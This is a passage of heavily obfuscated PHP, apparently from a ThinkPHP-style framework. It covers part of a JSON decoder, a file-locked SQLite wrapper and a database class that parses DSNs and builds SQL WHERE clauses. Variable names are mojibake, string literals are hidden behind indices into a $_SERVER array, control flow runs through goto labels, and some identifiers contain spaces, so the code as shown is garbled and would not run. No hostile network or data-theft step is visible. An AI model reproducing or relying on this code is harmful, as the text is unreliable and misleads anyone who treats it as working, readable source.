array($cÀ×´áåîÛ[1336] => SERVICES_JSON_IN_ARR, $cÀ×´áåîÛ[255] => $D‡©¼‘óŒŞ, $cÀ×´áåîÛ[1337] => !1)); } elseif ($aó„Ö›¥ğô[$D‡©¼‘óŒŞ] == $cÀ×´áåîÛ[1323] && $CÃ‹îË²®‰[$cÀ×´áåîÛ[1336]] == SERVICES_JSON_IN_ARR) { array_pop($Aà˜Éƒ©Ö); } elseif ($aó„Ö›¥ğô[$D‡©¼‘óŒŞ] == $cÀ×´áåîÛ[790] && in_array($CÃ‹îË²®‰[$cÀ×´áåîÛ[1336]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Aà˜Éƒ©Ö, array($cÀ×´áåîÛ[1336] => SERVICES_JSON_IN_OBJ, $cÀ×´áåîÛ[255] => $D‡©¼‘óŒŞ, $cÀ×´áåîÛ[1337] => !1)); } elseif ($aó„Ö›¥ğô[$D‡©¼‘óŒŞ] == $cÀ×´áåîÛ[307] && $CÃ‹îË²®‰[$cÀ×´áåîÛ[1336]] == SERVICES_JSON_IN_OBJ) { array_pop($Aà˜Éƒ©Ö); } elseif ($bÏ·›„™÷İ == $cÀ×´áåîÛ[1340] && in_array($CÃ‹îË²®‰[$cÀ×´áåîÛ[1336]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Aà˜Éƒ©Ö, array($cÀ×´áåîÛ[1336] => SERVICES_JSON_IN_CMT, $cÀ×´áåîÛ[255] => $D‡©¼‘óŒŞ, $cÀ×´áåîÛ[1337] => !1)); $D‡©¼‘óŒŞ++; } elseif ($bÏ·›„™÷İ == $cÀ×´áåîÛ[1341] && $CÃ‹îË²®‰[$cÀ×´áåîÛ[1336]] == SERVICES_JSON_IN_CMT) { array_pop($Aà˜Éƒ©Ö); $D‡©¼‘óŒŞ++; for ($c ÜƒØ¾µÊ = $CÃ‹îË²®‰[$cÀ×´áåîÛ[255]]; $c ÜƒØ¾µÊ <= $D‡©¼‘óŒŞ; ++$c ÜƒØ¾µÊ) { $aó„Ö›¥ğô = substr_replace($aó„Ö›¥ğô, $cÀ×´áåîÛ[50], $c ÜƒØ¾µÊ, 1); } } } if (reset($Aà˜Éƒ©Ö) == SERVICES_JSON_IN_ARR) { return $d¼¯–¹ñ‘Æ; } elseif (reset($Aà˜Éƒ©Ö) == SERVICES_JSON_IN_OBJ) { return $dïôËŞÄµ¤; } goto Dº…”–¤É; e»Ò¯ÁšÉÚ: $aó„Ö›¥ğô = $this->reduce_string($aó„Ö›¥ğô); if ($aó„Ö›¥ğô == $cÀ×´áåîÛ[33]) { if (reset($Aà˜Éƒ©Ö) == SERVICES_JSON_IN_ARR) { return $d¼¯–¹ñ‘Æ; } else { return $dïôËŞÄµ¤; } } $dÈ–á‰ßöÅ = strlen($aó„Ö›¥ğô); goto Fô«„²ÕÒœ; A‹„Ô¾¹»İ: if ($DÒ¯ƒí´¡ß[0] == $cÀ×´áåîÛ[1322]) { $Aà˜Éƒ©Ö = array(SERVICES_JSON_IN_ARR); $d¼¯–¹ñ‘Æ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Aà˜Éƒ©Ö = array(SERVICES_JSON_IN_OBJ); $dïôËŞÄµ¤ = array(); } else { $Aà˜Éƒ©Ö = array(SERVICES_JSON_IN_OBJ); $dïôËŞÄµ¤ = new stdClass(); } } array_push($Aà˜Éƒ©Ö, array($cÀ×´áåîÛ[1336] => SERVICES_JSON_SLICE, $cÀ×´áåîÛ[255] => 0, $cÀ×´áåîÛ[1337] => !1)); $aó„Ö›¥ğô = substr($DÒ¯ƒí´¡ß, 1, -1); goto e»Ò¯ÁšÉÚ; Dº…”–¤É: } } } function isError($d¢Ã·ö©Ü, $a±æìäƒ = null) { $Fª¯ñ¨‡É— =& $_SERVER[ÍÓÖ€°å]; if (class_exists($Fª¯ñ¨‡É—[1342])) { return PEAR::isError($d¢Ã·ö©Ü, $a±æìäƒ); } elseif (is_object($d¢Ã·ö©Ü) && (get_class($d¢Ã·ö©Ü) == $Fª¯ñ¨‡É—[1343] || is_subclass_of($d¢Ã·ö©Ü, $Fª¯ñ¨‡É—[1343]))) { return !0; } return !1; } } goto dÆ³ò‹²Çì; d©øãİš±: class DbSqlite3 extends DbSqlite3Base { public function query($e¢¹„ªê³œ) { goto BíÁ‚šŒåá; BíÁ‚šŒåá: $dçØÕË­³ =& $_SERVER[ÍÓÖ€°å]; $f¦°Äì†Õ = DATA_PATH . $dçØÕË­³[627]; $eˆ«áïì„É = fopen($f¦°Äì†Õ, $dçØÕË­³[628]); goto cñŒÓÛ›´Ä; Fàœ±ŒŒá: show_json($dçØÕË­³[629], !1); return !1; goto dŒª£„¯âÔ; cñŒÓÛ›´Ä: if (flock($eˆ«áïì„É, LOCK_EX)) { $c°ãÆ¢ãÉ­ = parent::query($e¢¹„ªê³œ); flock($eˆ«áïì„É, LOCK_UN); fclose($eˆ«áïì„É); return $c°ãÆ¢ãÉ­; } flock($eˆ«áïì„É, LOCK_UN); fclose($eˆ«áïì„É); goto Fàœ±ŒŒá; dŒª£„¯âÔ: } public function execute($fÆÜ…ÑëÍ) { goto DÄˆ”¶êÑ¶; Aîµµš¦°Œ: if (flock($E‰‹…Ò»ç­, LOCK_EX)) { $E´óÆ‹Ü×‚ = parent::execute($fÆÜ…ÑëÍ); flock($E‰‹…Ò»ç­, LOCK_UN); fclose($E‰‹…Ò»ç­); return $E´óÆ‹Ü×‚; } flock($E‰‹…Ò»ç­, LOCK_UN); fclose($E‰‹…Ò»ç­); goto Dß×øÒñ²Ü; Dß×øÒñ²Ü: show_json($FóÉÔ®×ĞÆ[629], !1); return !1; goto BÓÃÛáÙ; DÄˆ”¶êÑ¶: $FóÉÔ®×ĞÆ =& $_SERVER[ÍÓÖ€°å]; $Cˆ¤½êî = DATA_PATH . $FóÉÔ®×ĞÆ[627]; $E‰‹…Ò»ç­ = fopen($Cˆ¤½êî, $FóÉÔ®×ĞÆ[628]); goto Aîµµš¦°Œ; BÓÃÛáÙ: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\161" => "\75", "\x6e\145\161" => "\74\x3e", "\147\x74" => "\76", "\145\x67\164" => "\x3e\75", "\154\x74" => "\74", "\145\154\164" => "\74\75", "\x6e\x6f\164\x6c\151\153\145" => "\116\x4f\x54\40\x4c\111\x4b\105", "\x6c\151\x6b\x65" => "\114\x49\x4b\105", "\151\156" => "\111\x4e", "\x6e\157\x74\151\156" => "\x4e\117\x54\x20\111\x4e", "\x6e\x6f\x74\40\151\156" => "\x4e\x4f\124\40\111\116", "\x62\145\x74\x77\x65\x65\156" => "\x42\105\124\127\x45\x45\116", "\x6e\x6f\x74\x62\145\164\x77\145\x65\x6e" => "\116\x4f\124\40\x42\x45\x54\127\x45\x45\116", "\156\x6f\164\x20\142\145\x74\x77\x65\145\156" => "\x4e\117\124\40\x42\105\124\127\x45\x45\116"); protected $selectSql = "\x53\x45\114\105\x43\124\45\x44\111\123\x54\111\x4e\103\124\x25\40\45\x46\x49\105\114\104\45\x20\x46\x52\x4f\115\x20\x25\x54\101\102\114\105\45\45\112\117\x49\x4e\x25\45\127\x48\105\x52\x45\45\45\107\x52\x4f\125\x50\x25\45\x48\x41\x56\x49\116\107\x25\45\117\122\x44\x45\x52\45\45\x4c\111\115\111\x54\x25\x20\x25\x55\116\x49\117\116\x25\45\103\117\115\115\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $E»é®›šÒÎ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ÍÓÖ€°å][630], $E»é®›šÒÎ); } public function factory($bŞô»ø«±œ = '') { goto Aïğ‹¥‚ªĞ; Aïğ‹¥‚ªĞ: $A¢Š¯êŒ =& $_SERVER[ÍÓÖ€°å]; $bŞô»ø«±œ = $this->parseConfig($bŞô»ø«±œ); if (empty($bŞô»ø«±œ[$A¢Š¯êŒ[631]])) { think_exception(think_lang($A¢Š¯êŒ[632])); } goto eƒ¼ôÚÜ’Ë; DÕÅìÇŒµ: return $d›¸Š®×»ò; goto aÉ´‹•öŒ´; eƒ¼ôÚÜ’Ë: $this->dbType = ucwords(strtolower($bŞô»ø«±œ[$A¢Š¯êŒ[631]])); $b…á±  = $A¢Š¯êŒ[633] . $this->dbType; if (class_exists($b…á± )) { $d›¸Š®×»ò = new $b…á± ($bŞô»ø«±œ); if ($A¢Š¯êŒ[482] != strtolower($bŞô»ø«±œ[$A¢Š¯êŒ[631]])) { $d›¸Š®×»ò->dbType = strtoupper($this->dbType); } else { $d›¸Š®×»ò->dbType = $this->_getDsnType($bŞô»ø«±œ[$A¢Š¯êŒ[583]]); } } else { think_exception(think_lang($A¢Š¯êŒ[634]) . $A¢Š¯êŒ[635] . $b…á± ); } goto DÕÅìÇŒµ; aÉ´‹•öŒ´: } public function __call($B÷òßˆ„‚ó, $CÏÕ¥î) { if (method_exists($this, $B÷òßˆ„‚ó)) { return call_user_func_array(array($this, $B÷òßˆ„‚ó), $CÏÕ¥î); } } protected function _getDsnType($Aİ¢¾†äÛ©) { $Bà¿¸ë›ªà = explode($_SERVER[ÍÓÖ€°å][4], $Aİ¢¾†äÛ©); $b°ñİ‹Ç = strtoupper(trim($Bà¿¸ë›ªà[0])); return $b°ñİ‹Ç; } private function parseConfig($DÃÚ†øÌ´ê = '') { $D‘‘Ï¥Â†ò =& $_SERVER[ÍÓÖ€°å]; if (!empty($DÃÚ†øÌ´ê) && is_string($DÃÚ†øÌ´ê)) { $DÃÚ†øÌ´ê = $this->parseDSN($DÃÚ†øÌ´ê); } elseif (is_array($DÃÚ†øÌ´ê)) { $DÃÚ†øÌ´ê = array_change_key_case($DÃÚ†øÌ´ê); $DÃÚ†øÌ´ê = array($D‘‘Ï¥Â†ò[631] => $DÃÚ†øÌ´ê[$D‘‘Ï¥Â†ò[636]], $D‘‘Ï¥Â†ò[555] => $DÃÚ†øÌ´ê[$D‘‘Ï¥Â†ò[637]], $D‘‘Ï¥Â†ò[556] => $DÃÚ†øÌ´ê[$D‘‘Ï¥Â†ò[638]], $D‘‘Ï¥Â†ò[553] => $DÃÚ†øÌ´ê[$D‘‘Ï¥Â†ò[639]], $D‘‘Ï¥Â†ò[554] => $DÃÚ†øÌ´ê[$D‘‘Ï¥Â†ò[640]], $D‘‘Ï¥Â†ò[17] => $DÃÚ†øÌ´ê[$D‘‘Ï¥Â†ò[641]], $D‘‘Ï¥Â†ò[583] => $DÃÚ†øÌ´ê[$D‘‘Ï¥Â†ò[642]], $D‘‘Ï¥Â†ò[13] => $DÃÚ†øÌ´ê[$D‘‘Ï¥Â†ò[643]]); } elseif (empty($DÃÚ†øÌ´ê)) { if (think_config($D‘‘Ï¥Â†ò[484]) && $D‘‘Ï¥Â†ò[482] != strtolower(think_config($D‘‘Ï¥Â†ò[481]))) { $DÃÚ†øÌ´ê = $this->parseDSN(think_config($D‘‘Ï¥Â†ò[484])); } else { $DÃÚ†øÌ´ê = array($D‘‘Ï¥Â†ò[631] => think_config($D‘‘Ï¥Â†ò[481]), $D‘‘Ï¥Â†ò[555] => think_config($D‘‘Ï¥Â†ò[644]), $D‘‘Ï¥Â†ò[556] => think_config($D‘‘Ï¥Â†ò[645]), $D‘‘Ï¥Â†ò[553] => think_config($D‘‘Ï¥Â†ò[646]), $D‘‘Ï¥Â†ò[554] => think_config($D‘‘Ï¥Â†ò[647]), $D‘‘Ï¥Â†ò[17] => think_config($D‘‘Ï¥Â†ò[226]), $D‘‘Ï¥Â†ò[583] => think_config($D‘‘Ï¥Â†ò[484]), $D‘‘Ï¥Â†ò[13] => think_config($D‘‘Ï¥Â†ò[648])); } } return $DÃÚ†øÌ´ê; } protected function initConnect($a±³ËíÖùø = true) { if (1 == think_config($_SERVER[ÍÓÖ€°å][18])) { $this->_linkID = $this->multiConnect($a±³ËíÖùø); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($a‰“´…°¥ = false) { $cè‡äøß’´ =& $_SERVER[ÍÓÖ€°å]; static $A«Ù¡Ïƒ¦ª = array(); if (empty($A«Ù¡Ïƒ¦ª)) { foreach ($this->config as $dÏ…ßÓ¤Ñ => $B±œ­ÛÈñ•) { $A«Ù¡Ïƒ¦ª[$dÏ…ßÓ¤Ñ] = explode($cè‡äøß’´[47], $B±œ­ÛÈñ•); } } if (think_config($cè‡äøß’´[649])) { if ($a‰“´…°¥) { $A’ª×µÀ»¢ = floor(mt_rand(0, think_config($cè‡äøß’´[650]) - 1)); } else { if (is_numeric(think_config($cè‡äøß’´[651]))) { $A’ª×µÀ»¢ = think_config($cè‡äøß’´[651]); } else { $A’ª×µÀ»¢ = floor(mt_rand(think_config($cè‡äøß’´[650]), count($A«Ù¡Ïƒ¦ª[$cè‡äøß’´[553]]) - 1)); } } } else { $A’ª×µÀ»¢ = floor(mt_rand(0, count($A«Ù¡Ïƒ¦ª[$cè‡äøß’´[553]]) - 1)); } $dñÇ³ÜŒäí = array($cè‡äøß’´[555] => isset($A«Ù¡Ïƒ¦ª[$cè‡äøß’´[555]][$A’ª×µÀ»¢]) ? $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[555]][$A’ª×µÀ»¢] : $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[555]][0], $cè‡äøß’´[556] => isset($A«Ù¡Ïƒ¦ª[$cè‡äøß’´[556]][$A’ª×µÀ»¢]) ? $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[556]][$A’ª×µÀ»¢] : $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[556]][0], $cè‡äøß’´[553] => isset($A«Ù¡Ïƒ¦ª[$cè‡äøß’´[553]][$A’ª×µÀ»¢]) ? $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[553]][$A’ª×µÀ»¢] : $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[553]][0], $cè‡äøß’´[554] => isset($A«Ù¡Ïƒ¦ª[$cè‡äøß’´[554]][$A’ª×µÀ»¢]) ? $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[554]][$A’ª×µÀ»¢] : $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[554]][0], $cè‡äøß’´[17] => isset($A«Ù¡Ïƒ¦ª[$cè‡äøß’´[17]][$A’ª×µÀ»¢]) ? $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[17]][$A’ª×µÀ»¢] : $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[17]][0], $cè‡äøß’´[583] => isset($A«Ù¡Ïƒ¦ª[$cè‡äøß’´[583]][$A’ª×µÀ»¢]) ? $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[583]][$A’ª×µÀ»¢] : $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[583]][0], $cè‡äøß’´[13] => isset($A«Ù¡Ïƒ¦ª[$cè‡äøß’´[13]][$A’ª×µÀ»¢]) ? $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[13]][$A’ª×µÀ»¢] : $A«Ù¡Ïƒ¦ª[$cè‡äøß’´[13]][0]); return $this->connect($dñÇ³ÜŒäí, $A’ª×µÀ»¢); } public function parseDSN($aå‡Û÷†) { $BÅ«Íåˆ‡ =& $_SERVER[ÍÓÖ€°å]; if (empty($aå‡Û÷†)) { return !1; } $D…˜´ãÀ‹… = parse_url($aå‡Û÷†); if ($D…˜´ãÀ‹…[$BÅ«Íåˆ‡[156]]) { $E’í¹ù˜Ú = array($BÅ«Íåˆ‡[631] => $D…˜´ãÀ‹…[$BÅ«Íåˆ‡[156]], $BÅ«Íåˆ‡[555] => isset($D…˜´ãÀ‹…[$BÅ«Íåˆ‡[407]]) ? $D…˜´ãÀ‹…[$BÅ«Íåˆ‡[407]] : $BÅ«Íåˆ‡[33], $BÅ«Íåˆ‡[556] => isset($D…˜´ãÀ‹…[$BÅ«Íåˆ‡[652]]) ? $D…˜´ãÀ‹…[$BÅ«Íåˆ‡[652]] : $BÅ«Íåˆ‡[33], $BÅ«Íåˆ‡[553] => isset($D…˜´ãÀ‹…[$BÅ«Íåˆ‡[157]]) ? $D…˜´ãÀ‹…[$BÅ«Íåˆ‡[157]] : $BÅ«Íåˆ‡[33], $BÅ«Íåˆ‡[554] => isset($D…˜´ãÀ‹…[$BÅ«Íåˆ‡[158]]) ? $D…˜´ãÀ‹…[$BÅ«Íåˆ‡[158]] : $BÅ«Íåˆ‡[33], $BÅ«Íåˆ‡[17] => isset($D…˜´ãÀ‹…[$BÅ«Íåˆ‡[76]]) ? substr($D…˜´ãÀ‹…[$BÅ«Íåˆ‡[76]], 1) : $BÅ«Íåˆ‡[33]); } else { preg_match($BÅ«Íåˆ‡[653], trim($aå‡Û÷†), $c†îèğÕ›‡); $E’í¹ù˜Ú = array($BÅ«Íåˆ‡[631] => $c†îèğÕ›‡[1], $BÅ«Íåˆ‡[555] => $c†îèğÕ›‡[2], $BÅ«Íåˆ‡[556] => $c†îèğÕ›‡[3], $BÅ«Íåˆ‡[553] => $c†îèğÕ›‡[4], $BÅ«Íåˆ‡[554] => $c†îèğÕ›‡[5], $BÅ«Íåˆ‡[17] => $c†îèğÕ›‡[6]); } $E’í¹ù˜Ú[$BÅ«Íåˆ‡[583]] = $BÅ«Íåˆ‡[33]; return $E’í¹ù˜Ú; } protected function debug() { $cĞëÜŒìº½ =& $_SERVER[ÍÓÖ€°å]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $cĞëÜŒìº½[654]; if (think_config($cĞëÜŒìº½[655])) { think_status($cĞëÜŒìº½[656]); think_trace($this->queryStr . $cĞëÜŒìº½[657] . think_status($cĞëÜŒìº½[20], $cĞëÜŒìº½[656], 6) . $cĞëÜŒìº½[658], $cĞëÜŒìº½[33], $cĞëÜŒìº½[659]); } } protected function parseLock($FøÈˆ¡±ŞÌ = false) { $DƒÒÎ–×° =& $_SERVER[ÍÓÖ€°å]; if (!$FøÈˆ¡±ŞÌ) { return $DƒÒÎ–×°[33]; } if ($DƒÒÎ–×°[585] == $this->dbType) { return $DƒÒÎ–×°[660]; } return $DƒÒÎ–×°[661]; } protected function parseSet($bØœ´¨—©ê) { $DÂ°ó´™±¹ =& $_SERVER[ÍÓÖ€°å]; foreach ($bØœ´¨—©ê as $D¬ßÁğ×æ => $bÃ§Ï§®«°) { if (is_array($bÃ§Ï§®«°) && $DÂ°ó´™±¹[277] == $bÃ§Ï§®«°[0]) { $bÊŠ¸Â³ÕÊ[] = $this->parseKey($D¬ßÁğ×æ) . $DÂ°ó´™±¹[662] . $bÃ§Ï§®«°[1]; } elseif (is_scalar($bÃ§Ï§®«°) || is_null($bÃ§Ï§®«°)) { $bÊŠ¸Â³ÕÊ[] = $this->parseKey($D¬ßÁğ×æ) . $DÂ°ó´™±¹[662] . $this->parseValue($bÃ§Ï§®«°); } } return $DÂ°ó´™±¹[663] . implode($DÂ°ó´™±¹[47], $bÊŠ¸Â³ÕÊ); } protected function bindParam($aÎßììê†Ñ, $CğÊ õ¸) { $this->bind[$_SERVER[ÍÓÖ€°å][4] . $aÎßììê†Ñ] = $CğÊ õ¸; } protected function parseBind($E‘ÌÕù£Æç) { $E‘ÌÕù£Æç = array_merge($this->bind, $E‘ÌÕù£Æç); $this->bind = array(); return $E‘ÌÕù£Æç; } function parseKey(&$eøÜö´Ñšñ, $F¨®ÌŒ… = true) { if ($F¨®ÌŒ…) { $eøÜö´Ñšñ = $this->parseKeyCheck($eøÜö´Ñšñ); } return $eøÜö´Ñšñ; } function parseKeyCheck($d¼à­ãòÖ) { $Cæé”À–õ¹ =& $_SERVER[ÍÓÖ€°å]; $d¼à­ãòÖ = trim($d¼à­ãòÖ); if (!preg_match($Cæé”À–õ¹[664], $d¼à­ãòÖ)) { think_exception($Cæé”À–õ¹[665] . $d¼à­ãòÖ); } return $d¼à­ãòÖ; } protected function parseValue($fªšƒÛ’) { $b¥íÎéÀ–Ÿ =& $_SERVER[ÍÓÖ€°å]; if (is_string($fªšƒÛ’)) { $fªšƒÛ’ = $b¥íÎéÀ–Ÿ[624] . $this->escapeString($fªšƒÛ’) . $b¥íÎéÀ–Ÿ[624]; } elseif (isset($fªšƒÛ’[0]) && is_string($fªšƒÛ’[0]) && strtolower($fªšƒÛ’[0]) == $b¥íÎéÀ–Ÿ[277]) { $fªšƒÛ’ = $this->escapeString($fªšƒÛ’[1]); } elseif (is_array($fªšƒÛ’)) { $fªšƒÛ’ = array_map(array($this, $b¥íÎéÀ–Ÿ[625]), $fªšƒÛ’); } elseif (is_bool($fªšƒÛ’)) { $fªšƒÛ’ = $fªšƒÛ’ ? $b¥íÎéÀ–Ÿ[367] : $b¥íÎéÀ–Ÿ[393]; } elseif (is_null($fªšƒÛ’)) { $fªšƒÛ’ = $b¥íÎéÀ–Ÿ[98]; } return $fªšƒÛ’; } protected function parseField($EĞ•¾³¿…–) { $a«°Êøçê =& $_SERVER[ÍÓÖ€°å]; if (is_string($EĞ•¾³¿…–) && strpos($EĞ•¾³¿…–, $a«°Êøçê[47])) { $EĞ•¾³¿…– = explode($a«°Êøçê[47], $EĞ•¾³¿…–); } if (is_array($EĞ•¾³¿…–)) { $b»®§Ô¸ = array(); foreach ($EĞ•¾³¿…– as $AÌì¯Ì¯á => $E´¤Î¹Û…¼) { if (!is_numeric($AÌì¯Ì¯á)) { $b»®§Ô¸[] = $this->parseKey($AÌì¯Ì¯á) . $a«°Êøçê[666] . $this->parseKey($E´¤Î¹Û…¼); } else { $b»®§Ô¸[] = $this->parseKey($E´¤Î¹Û…¼); } } $aî…È¯ˆÔ = implode($a«°Êøçê[47], $b»®§Ô¸); } elseif (is_string($EĞ•¾³¿…–) && !empty($EĞ•¾³¿…–)) { $aî…È¯ˆÔ = $EĞ•¾³¿…–; } else { $aî…È¯ˆÔ = $a«°Êøçê[164]; } return $aî…È¯ˆÔ; } protected function parseTable($CŠ‚ÉÙˆËÚ) { $CÅÔŸ¼ó…ä =& $_SERVER[ÍÓÖ€°å]; if (is_array($CŠ‚ÉÙˆËÚ)) { $Dİ¯¿ÇĞóÅ = array(); foreach ($CŠ‚ÉÙˆËÚ as $AÌ‡ ¶Â¹ => $D‰ò×ƒŒÒ¿) { if (!is_numeric($AÌ‡ ¶Â¹)) { $Dİ¯¿ÇĞóÅ[] = $this->parseKey($AÌ‡ ¶Â¹) . $CÅÔŸ¼ó…ä[50] . $this->parseKey($D‰ò×ƒŒÒ¿); } else { $Dİ¯¿ÇĞóÅ[] = $this->parseKey($AÌ‡ ¶Â¹); } } $CŠ‚ÉÙˆËÚ = $Dİ¯¿ÇĞóÅ; } elseif (is_string($CŠ‚ÉÙˆËÚ)) { if (strstr($CŠ‚ÉÙˆËÚ, $CÅÔŸ¼ó…ä[50])) { return $CŠ‚ÉÙˆËÚ; } $CŠ‚ÉÙˆËÚ = explode($CÅÔŸ¼ó…ä[47], $CŠ‚ÉÙˆËÚ); array_walk($CŠ‚ÉÙˆËÚ, array($this, $CÅÔŸ¼ó…ä[572])); } return $CÅÔŸ¼ó…ä[667] . trim(implode($CÅÔŸ¼ó…ä[668], $CŠ‚ÉÙˆËÚ), $CÅÔŸ¼ó…ä[578]) . $CÅÔŸ¼ó…ä[667]; } protected function parseWhere($d’Á­²™²‹) { $F°­÷ç™ =& $_SERVER[ÍÓÖ€°å]; $FÅ„„Ü— Ğ = $F°­÷ç™[33]; if (is_string($d’Á­²™²‹)) { $FÅ„„Ü— Ğ = $d’Á­²™²‹; } else { $a½‹åÕÙ“’ = isset($d’Á­²™²‹[$F°­÷ç™[669]]) ? strtoupper($d’Á­²™²‹[$F°­÷ç™[669]]) : $F°­÷ç™[33]; if (in_array($a½‹åÕÙ“’, array($F°­÷ç™[670], $F°­÷ç™[671], $F°­÷ç™[672]))) { $a½‹åÕÙ“’ = $F°­÷ç™[50] . $a½‹åÕÙ“’ . $F°­÷ç™[50]; unset($d’Á­²™²‹[$F°­÷ç™[669]]); } else { $a½‹åÕÙ“’ = $F°­÷ç™[673]; } foreach ($d’Á­²™²‹ as $b˜Ä„‚¢ÎÂ => $e‰ëíõØï) { $FÅ„„Ü— Ğ .= $F°­÷ç™[257]; if (is_numeric($b˜Ä„‚¢ÎÂ)) { $b˜Ä„‚¢ÎÂ = $F°­÷ç™[674]; } if (0 === strpos($b˜Ä„‚¢ÎÂ, $F°­÷ç™[71])) { $FÅ„„Ü— Ğ .= $this->parseThinkWhere($b˜Ä„‚¢ÎÂ, $e‰ëíõØï); } else { if (!preg_match($F°­÷ç™[675], trim($b˜Ä„‚¢ÎÂ))) { think_exception(think_lang($F°­÷ç™[676]) . $F°­÷ç™[4] . $b˜Ä„‚¢ÎÂ); } $eõ¹¿¿¤ê¿ = is_array($e‰ëíõØï) && isset($e‰ëíõØï[$F°­÷ç™[677]]); $b˜Ä„‚¢ÎÂ = trim($b˜Ä„‚¢ÎÂ); if (strpos($b˜Ä„‚¢ÎÂ, $F°­÷ç™[263])) { $Aˆ£«ÅÀÁª = explode($F°­÷ç™[263], $b˜Ä„‚¢ÎÂ); $a«ÁõîŒç… = array(); foreach ($Aˆ£«ÅÀÁª as $B¥“¿™ÈË› => $fñ‡Ê£§¼) { $FÌ¨†ò¶È = $eõ¹¿¿¤ê¿ ? $e‰ëíõØï[$B¥“¿™ÈË›] : $e‰ëíõØï; $a«ÁõîŒç…[] = $F°­÷ç™[240] . $this->parseWhereItem($this->parseKey($fñ‡Ê£§¼), $FÌ¨†ò¶È) . $F°­÷ç™[571]; } $FÅ„„Ü— Ğ .= implode($F°­÷ç™[678], $a«ÁõîŒç…); } elseif (strpos($b˜Ä„‚¢ÎÂ, $F°­÷ç™[264])) { $Aˆ£«ÅÀÁª = explode($F°­÷ç™[264], $b˜Ä„‚¢ÎÂ); $a«ÁõîŒç… = array(); foreach ($Aˆ£«ÅÀÁª as $B¥“¿™ÈË› => $fñ‡Ê£§¼) { $FÌ¨†ò¶È = $eõ¹¿¿¤ê¿ ? $e‰ëíõØï[$B¥“¿™ÈË›] : $e‰ëíõØï; $a«ÁõîŒç…[] = $F°­÷ç™[240] . $this->parseWhereItem($this->parseKey($fñ‡Ê£§¼), $FÌ¨†ò¶È) . $F°­÷ç™[571]; } $FÅ„„Ü— Ğ .= implode($F°­÷ç™[673], $a«ÁõîŒç…); } else { $FÅ„„Ü— Ğ .= $this->parseWhereItem($this->parseKey($b˜Ä„‚¢ÎÂ), $e‰ëíõØï); } } $FÅ„„Ü— Ğ .= $F°­÷ç™[258] . $a½‹åÕÙ“’; } $FÅ„„Ü— Ğ = substr($FÅ„„Ü— Ğ, 0, -strlen($a½‹åÕÙ“’)); } return empty($FÅ„„Ü— Ğ) ? $F°­÷ç™[33] : $F°­÷ç™[679] . $FÅ„„Ü— Ğ; } protected function parseWhereItem($Fó¹‡‰°šô, $eˆ³ƒÄ¯ë¤) { $C¥Ü™˜Ö÷¨ =& $_SERVER[ÍÓÖ€°å]; $dË³»¿Ş…˜ = $C¥Ü™˜Ö÷¨[33]; if (is_array($eˆ³ƒÄ¯ë¤)) { if (is_string($eˆ³ƒÄ¯ë¤[0])) { $D‡Šİ = strtolower($eˆ³ƒÄ¯ë¤[0]); if (in_array($eˆ³ƒÄ¯ë¤[0], array($C¥Ü™˜Ö÷¨[662], $C¥Ü™˜Ö÷¨[680], $C¥Ü™˜Ö÷¨[681], $C¥Ü™˜Ö÷¨[682], $C¥Ü™˜Ö÷¨[683], $C¥Ü™˜Ö÷¨[684]))) { $dË³»¿Ş…˜ .= $Fó¹‡‰°šô . $C¥Ü™˜Ö÷¨[50] . $eˆ³ƒÄ¯ë¤[0] . $C¥Ü™˜Ö÷¨[50] . $this->parseValue($eˆ³ƒÄ¯ë¤[1]); } elseif (preg_match($C¥Ü™˜Ö÷¨[685], $eˆ³ƒÄ¯ë¤[0])) { $dË³»¿Ş…˜ .= $Fó¹‡‰°šô . $C¥Ü™˜Ö÷¨[50] . $this->exp[$D‡Šİ] . $C¥Ü™˜Ö÷¨[50] . $this->parseValue($eˆ³ƒÄ¯ë¤[1]); } elseif (preg_match($C¥Ü™˜Ö÷¨[686], $eˆ³ƒÄ¯ë¤[0])) { if (is_array($eˆ³ƒÄ¯ë¤[1])) { $Dô„å—‰à = isset($eˆ³ƒÄ¯ë¤[2]) ? strtoupper($eˆ³ƒÄ¯ë¤[2]) : $C¥Ü™˜Ö÷¨[671]; if (in_array($Dô„å—‰à, array($C¥Ü™˜Ö÷¨[670], $C¥Ü™˜Ö÷¨[671], $C¥Ü™˜Ö÷¨[672]))) { $BÂçîæ¸øÚ = array(); foreach ($eˆ³ƒÄ¯ë¤[1] as $c—–¶ìíŒ¯) { $BÂçîæ¸øÚ[] = $Fó¹‡‰°šô . $C¥Ü™˜Ö÷¨[50] . $this->exp[$D‡Šİ] . $C¥Ü™˜Ö÷¨[50] . $this->parseValue($c—–¶ìíŒ¯); } $dË³»¿Ş…˜ .= $C¥Ü™˜Ö÷¨[240] . implode($C¥Ü™˜Ö÷¨[50] . $Dô„å—‰à . $C¥Ü™˜Ö÷¨[50], $BÂçîæ¸øÚ) . $C¥Ü™˜Ö÷¨[571]; } } else { $dË³»¿Ş…˜ .= $Fó¹‡‰°šô . $C¥Ü™˜Ö÷¨[50] . $this->exp[$D‡Šİ] . $C¥Ü™˜Ö÷¨[50] . $this->parseValue($eˆ³ƒÄ¯ë¤[1]); } } elseif 